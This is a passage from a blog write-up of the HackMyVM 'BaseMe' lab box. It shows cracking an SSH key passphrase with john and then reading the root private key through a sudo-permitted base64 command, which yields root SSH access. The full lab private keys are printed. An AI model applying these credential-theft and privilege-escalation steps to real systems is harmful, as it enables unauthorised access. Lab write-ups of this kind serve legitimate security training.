MJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp
+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV
tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh
i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+
tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw
N7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM
Aif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ
O+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2
TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl
3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL
ND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ
LdmmRXUS/DtO+69/aidvxGAYob+1M<span class="o">=</span>            
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----  
</pre></table></code></div></div><p>Looks like we need not only the <code class="language-plaintext highlighter-rouge">id_rsa</code> but also <code class="language-plaintext highlighter-rouge">password</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# <span class="nb">chmod </span>600 id_rsa    
 
â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# ssh lucas@192.168.56.23          
lucas@192.168.56.23<span class="s1">'s password: 
Permission denied, please try again.
lucas@192.168.56.23'</span>s password: 
Permission denied, please try again.
lucas@192.168.56.23<span class="s1">'s password: 
lucas@192.168.56.23: Permission denied (publickey,password).
</span></pre></table></code></div></div><p>To check which password is for the <code class="language-plaintext highlighter-rouge">id_rsa</code> , lets use <code class="language-plaintext highlighter-rouge">john</code> to crack the password.</p><p>Using the previously encoded base64 <code class="language-plaintext highlighter-rouge">dic_b64.txt</code> .</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>
â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# locate ssh2john.py                                                                                                                                              
/usr/share/john/ssh2john.py
                                                                                                                                                                          
â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# python /usr/share/john/ssh2john.py id_rsa <span class="o">&gt;</span> id_rsa.hash 
                                                                                                                                                                                                                                                                                                                                                    
â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# john id_rsa.hash <span class="nt">-wordlist</span><span class="o">=</span>dic_b64.txt 
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH, SSH private key <span class="o">[</span>RSA/DSA/EC/OPENSSH 32/64]<span class="o">)</span>
Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 2 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 16 <span class="k">for </span>all loaded hashes
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
aWxvdmV5b3UK     <span class="o">(</span>id_rsa<span class="o">)</span>     
1g 0:00:00:00 DONE <span class="o">(</span>2021-12-25 04:50<span class="o">)</span> 3.030g/s 18.18p/s 18.18c/s 18.18C/s aWxvdmV5b3UK..dGhleWhhdGVzbWUK
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed. 

</pre></table></code></div></div><p>Great , the password is <code class="language-plaintext highlighter-rouge">aWxvdmV5b3UK</code> .</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# ssh lucas@192.168.56.23 <span class="nt">-i</span> id_rsa                                                                                                                               
Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: 
Linux baseme 4.19.0-9-amd64 <span class="c">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 28 12:51:36 2020 from 192.168.1.58
lucas@baseme:~<span class="nv">$ </span><span class="nb">whoami</span><span class="p">;</span><span class="nb">id</span><span class="p">;</span><span class="nb">hostname
</span>lucas
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>lucas<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>lucas<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>lucas<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>
baseme
</pre></table></code></div></div><p>Nice!</p><h2 id="shell-as-root">Shell as Root</h2><p>Standard enumeration shows <code class="language-plaintext highlighter-rouge">(ALL) NOPASSWD: /usr/bin/base64</code> we can run base64 as root. This means we can read important files such as <code class="language-plaintext highlighter-rouge">/etc/passwd</code> or <code class="language-plaintext highlighter-rouge">/etc/shadow</code> and crack password using john.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>lucas@baseme:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>lucas on baseme:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User lucas may run the following commands on baseme:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/base64
</pre></table></code></div></div><p>But obviously, the better way is to get itâ€™s <code class="language-plaintext highlighter-rouge">id_rsa</code> at <code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code> and then SSH into the server as root!!</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>lucas@baseme:~<span class="nv">$ </span><span class="nb">sudo base64</span> <span class="s2">"/root/.ssh/id_rsa"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAw6MgMnxUy+W9oem0Uhr2cJiez37qVubRK9D4kdu7H5NQ/Z0FFp2B
IdV3wx9xDWAICJgtYQUvOV7KFNAWvEXTDdhBwdiUcWEJ4AOXK7+5v7x4b8vuG5zK0lTVxp
DEBE8faPj3UaHsa1JUVaDngTIkCa6VBICvG0DCcfL8xHBpCSIfoHfpqmOpWT/pWXvGI3tk
/Ku/STY7Ay8HtSgoqCcf3F+lb9J9kwKhFg9eLO5QDuFujb1CN7gUy8xhgNanUViyCZRwn7
px+DfU+nscSEfG1zgfgqn2hCbBYqaP0jBgWcVL6YoMiwCS3jhmeFG4C/p51j3gI6b8yz9a
S+DtdTpDwQAAA8D82/wZ/Nv8GQAAAAdzc2gtcnNhAAABAQDDoyAyfFTL5b2h6bRSGvZwmJ
7PfupW5tEr0PiR27sfk1D9nQUWnYEh1XfDH3ENYAgImC1hBS85XsoU0Ba8RdMN2EHB2JRx
YQngA5crv7m/vHhvy+4bnMrSVNXGkMQETx9o+PdRoexrUlRVoOeBMiQJrpUEgK8bQMJx8v
zEcGkJIh+gd+mqY6lZP+lZe8Yje2T8q79JNjsDLwe1KCioJx/cX6Vv0n2TAqEWD14s7lAO
4W6NvUI3uBTLzGGA1qdRWLIJlHCfunH4N9T6exxIR8bXOB+CqfaEJsFipo/SMGBZxUvpig
yLAJLeOGZ4UbgL+nnWPeAjpvzLP1pL4O11OkPBAAAAAwEAAQAAAQBIArRoQOGJh9AMWBS6
oBgUC+lw4Ptq710Q7sOAFMxE7BnEsFZeI62TgZqqpNkdHjr2xuT1ME5YpK5niMzFkkIEd5
SEwK6rKRfUcB3lyZWaoMoIBJ1pZoY1c2qYw1KTb3hVUEbgsmRugIhwWGC+anFfavaJCMDr
nCO2g8VMnT/cTyAv/Qmi8m868KNEzcuzGV5ozHl1XLffHM9R/cqPPyAYaQIa9Z+kS6ou9R
iMTjTSxOPnfh286kgx0ry1se9BBlrEc5251R/PRkEKYrMj3AIwI30qvYlAtNfcCFhoJXLq
vWystPARwiUs7WYBUHRf6bPP/pHTTvwwb2bs51ngImpdAAAAgDaWnQ7Lj7Vp+mTjhSu4oG
ptDHNd2uuqB1+CHRcaVutUmknxvxG3p957UbvNp6e0+ePKtAIakrzbpAo6u25poyWugAuz
X2nQhqsQh6yrThDJlTiDMeV7JNGFbGOcanXXXHt3tjfyrS0+aM87WmwqNyh6nfgy1C5axR
fKZG8ivz5iAAAAgQD83QmCIcbZaCOlGwgHGcuCUDcxGY1QlIRnbM5VAjimNezGFs9f0ExD
SiTwFsmITP//njsbRZP2laiKKO6j4yp5LpfgDB5QHs+g4nXvDn6ns64gCKo7tf2bPP8VCe
FWyc2JyqREwE3WmyhkPlyr9xAZerZ+7Fz+NFueRYzDklWg8wAAAIEAxhBeLqbo6/GUKXF5
rFRatLXI43Jrd9pyvLx62KghsnEBEk7my9sbU5dvYBLztS+lfPCRxV2ZzpjYdN4SDJbXIR
txBaLJe3c4uIc9WjyxGwUK9IL65rSrRVERHsTO525ofPWGQEa2A+pRCpz3A4Y41fy8Y9an
<span class="nv">2B2NmfTAfEkWFXsAAAALcm9vdEBiYXNlbWU</span><span class="o">=</span>
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
</pre></table></code></div></div><p>On our local machine, lets save the private key and give the right permission before we SSH into the server as root!</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]  
â””â”€# <span class="nb">cat </span>id_rsa_root 
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAw6MgMnxUy+W9oem0Uhr2cJiez37qVubRK9D4kdu7H5NQ/Z0FFp2B
IdV3wx9xDWAICJgtYQUvOV7KFNAWvEXTDdhBwdiUcWEJ4AOXK7+5v7x4b8vuG5zK0lTVxp
DEBE8faPj3UaHsa1JUVaDngTIkCa6VBICvG0DCcfL8xHBpCSIfoHfpqmOpWT/pWXvGI3tk
/Ku/STY7Ay8HtSgoqCcf3F+lb9J9kwKhFg9eLO5QDuFujb1CN7gUy8xhgNanUViyCZRwn7
px+DfU+nscSEfG1zgfgqn2hCbBYqaP0jBgWcVL6YoMiwCS3jhmeFG4C/p51j3gI6b8yz9a
S+DtdTpDwQAAA8D82/wZ/Nv8GQAAAAdzc2gtcnNhAAABAQDDoyAyfFTL5b2h6bRSGvZwmJ
7PfupW5tEr0PiR27sfk1D9nQUWnYEh1XfDH3ENYAgImC1hBS85XsoU0Ba8RdMN2EHB2JRx
YQngA5crv7m/vHhvy+4bnMrSVNXGkMQETx9o+PdRoexrUlRVoOeBMiQJrpUEgK8bQMJx8v
zEcGkJIh+gd+mqY6lZP+lZe8Yje2T8q79JNjsDLwe1KCioJx/cX6Vv0n2TAqEWD14s7lAO
4W6NvUI3uBTLzGGA1qdRWLIJlHCfunH4N9T6exxIR8bXOB+CqfaEJsFipo/SMGBZxUvpig
yLAJLeOGZ4UbgL+nnWPeAjpvzLP1pL4O11OkPBAAAAAwEAAQAAAQBIArRoQOGJh9AMWBS6
oBgUC+lw4Ptq710Q7sOAFMxE7BnEsFZeI62TgZqqpNkdHjr2xuT1ME5YpK5niMzFkkIEd5
SEwK6rKRfUcB3lyZWaoMoIBJ1pZoY1c2qYw1KTb3hVUEbgsmRugIhwWGC+anFfavaJCMDr
nCO2g8VMnT/cTyAv/Qmi8m868KNEzcuzGV5ozHl1XLffHM9R/cqPPyAYaQIa9Z+kS6ou9R
iMTjTSxOPnfh286kgx0ry1se9BBlrEc5251R/PRkEKYrMj3AIwI30qvYlAtNfcCFhoJXLq
vWystPARwiUs7WYBUHRf6bPP/pHTTvwwb2bs51ngImpdAAAAgDaWnQ7Lj7Vp+mTjhSu4oG
ptDHNd2uuqB1+CHRcaVutUmknxvxG3p957UbvNp6e0+ePKtAIakrzbpAo6u25poyWugAuz
X2nQhqsQh6yrThDJlTiDMeV7JNGFbGOcanXXXHt3tjfyrS0+aM87WmwqNyh6nfgy1C5axR
fKZG8ivz5iAAAAgQD83QmCIcbZaCOlGwgHGcuCUDcxGY1QlIRnbM5VAjimNezGFs9f0ExD
SiTwFsmITP//njsbRZP2laiKKO6j4yp5LpfgDB5QHs+g4nXvDn6ns64gCKo7tf2bPP8VCe
FWyc2JyqREwE3WmyhkPlyr9xAZerZ+7Fz+NFueRYzDklWg8wAAAIEAxhBeLqbo6/GUKXF5
rFRatLXI43Jrd9pyvLx62KghsnEBEk7my9sbU5dvYBLztS+lfPCRxV2ZzpjYdN4SDJbXIR
txBaLJe3c4uIc9WjyxGwUK9IL65rSrRVERHsTO525ofPWGQEa2A+pRCpz3A4Y41fy8Y9an
<span class="nv">2B2NmfTAfEkWFXsAAAALcm9vdEBiYXNlbWU</span><span class="o">=</span>
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----

â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# <span class="nb">chmod </span>600 id_rsa_root      

                                                                                                                                                                          
â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/hackmyv/baseme]
â””â”€# ssh root@192.168.56.23 <span class="nt">-i</span> id_rsa_root
Linux baseme 4.19.0-9-amd64 <span class="c">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Dec 25 05:09:35 2021 from 192.168.56.3
root@baseme:~# 
root@baseme:~# <span class="nb">whoami</span><span class="p">;</span><span class="nb">id</span><span class="p">;</span><span class="nb">hostname
</span>root
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
baseme
</pre></table></code></div></div><p>Rooted!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackmyvm/'>hackmyvm</a>, <a href='/categories/easyy/'>easyy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/readable-files-or-script/" class="post-tag no-text-decoration" >Readable files or script</a> <a href="/tags/base64/" class="post-tag no-text-decoration" >base64</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=BaseMe - am-a-circle&url=https://am-a-circle.github.io//posts/BaseME/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=BaseMe - am-a-circle&u=https://am-a-circle.github.io//posts/BaseME/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=BaseMe - am-a-circle&url=https://am-a-circle.github.io//posts/BaseME/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CarPT-Part1/">Automobile Hacking - Part 1</a><li><a href="/posts/CarPT-Part2/">Automobile Hacking - Part 2</a><li><a href="/posts/CRTP/">Attacking and Defending Active Directory Lab Course</a><li><a href="/posts/goals/">Goals</a><li><a href="/posts/speed/">Speed</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentest/">Pentest</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/path-variable/">Path Variable</a> <a class="post-tag" href="/tags/base64/">base64</a> <a class="post-tag" href="/tags/cp/">cp</a> <a class="post-tag" href="/tags/crtp/">CRTP</a> <a class="post-tag" href="/tags/disk-group/">Disk Group</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/docker-escape/">Docker Escape</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/dominator/"><div class="card-body"> <span class="timeago small" >Feb 14, 2022<i class="unloaded">2022-02-14T15:04:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Dominator</h3><div class="text-muted small"><p> Overview Box Difficulty Link Easy hackmyvm Link Recon TCP Ports: 1 2 3 4 5 6 7 8 9 â”Œâ”€â”€(rootðŸ’€kali)-[/opt/hackmyv/dominator] â””â”€# masscan -...</p></div></div></a></div><div class="card"> <a href="/posts/connection/"><div class="card-body"> <span class="timeago small" >Dec 23, 2021<i class="unloaded">2021-12-23T19:59:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>hackmyvm: connection</h3><div class="text-muted small"><p> Overview Box Difficulty Link Easy hackmyvm Link Another easy box! This time, Iâ€™ll practice writing things in detail. Recon Objective : ...</p></div></div></a></div><div class="card"> <a href="/posts/pwned/"><div class="card-body"> <span class="timeago small" >Dec 23, 2021<i class="unloaded">2021-12-23T20:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>hackmyvm: pwned</h3><div class="text-muted small"><p> Overview Box Difficulty Link Easy hackmyvm Link Found this new site for vulnerable machines. For this box I downloaded it off hackmyvm an...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/suidy/" class="btn btn-outline-primary" prompt="Older"><p>suidy</p></a> <a href="/posts/Hommie/" class="btn btn-outline-primary" prompt="Newer"><p>Hommie</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> Â© 2024 <a href="https://github.com/am-a-circle">am-a-circle</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/pentest/">Pentest</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/path-variable/">Path Variable</a> <a class="post-tag" href="/tags/base64/">base64</a> <a class="post-tag" href="/tags/cp/">cp</a> <a class="post-tag" href="/tags/crtp/">CRTP</a> <a class="post-tag" href="/tags/disk-group/">Disk Group</a> <a class="post-tag" href="/tags/dns/">DNS</a> <a class="post-tag" href="/tags/docker-escape/">Docker Escape</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
